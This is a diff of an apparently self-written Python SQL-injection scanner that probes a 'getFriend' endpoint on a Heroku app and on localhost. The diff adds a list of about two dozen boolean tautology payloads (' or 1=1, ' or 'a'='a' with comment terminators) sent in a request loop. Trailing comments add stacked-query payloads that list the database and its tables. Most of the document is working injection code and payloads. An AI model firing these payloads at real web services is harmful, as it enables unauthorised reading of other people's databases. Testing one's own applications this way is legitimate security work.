@@ -9,17 +9,19 @@ import requests
 
 
 def check_boolean_based_attack(url):
-    arr = ["'%20OR%20'1'%20=%20'1';%20--%20", "\"%20OR%20'1'%20=%20'1';%20--%20", "%20OR%20'1'%20=%20'1';%20--%20"]
+    arr = [" or 1=1", "' or 1=1", "\" or 1=1", " or 1=1-", "' or 1=1-", "\" or 1=1-", " or 1=1#", "' or 1=1#",
+           "\" or 1=1", " 1=1#", " or 1=1/*", "' or 1=1/*", "\" or 1=1/*", "' or'", "' or", "' or'-", "' or-",
+           " or a=a", "' or a=a", "\" or a=a", " or a=a-", "' or a=a-", "\" or a=a-", " or 'a'='a'", " or \"a\"=\"a\""]
     for e in arr:
-        opener = urllib2.build_opener()
-        f = opener.open(url + e)
-        if f.getcode() == 200:
-            res = js.loads(f.read())
-            print "This web server is vulnerable for boolean based sql injection attack."
-            print "The response after boolean attack is:"
-            print res
-            print
-            break
+        r = requests.get(url + e + "%3B%20--%20")
+        if r.status_code == 200:
+            res = js.loads(r.content)
+            if len(res) != 0:
+                print "This web server is vulnerable for boolean based sql injection attack."
+                print "The response after boolean attack is:"
+                print res
+                print
+                break
 
 
 def check_stack_query(url):
@@ -96,11 +98,11 @@ def check_time_based_attack(url):
 online = "https://my-securitytest.herokuapp.com/getFriend/user1"
 local = "http://localhost:3000/getFriend/user1"
 
-check_boolean_based_attack(online)
-check_stack_query(online)
-check__error_based_attack(online)
-check_union_query_based_attack(online)
-check_time_based_attack(online)
+check_boolean_based_attack(local)
+# check_stack_query(online)
+# check__error_based_attack(online)
+# check_union_query_based_attack(online)
+# check_time_based_attack(online)
 
 # localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
 # localhost:3000/getFriend/user1'; SHOW TABLES; --%20
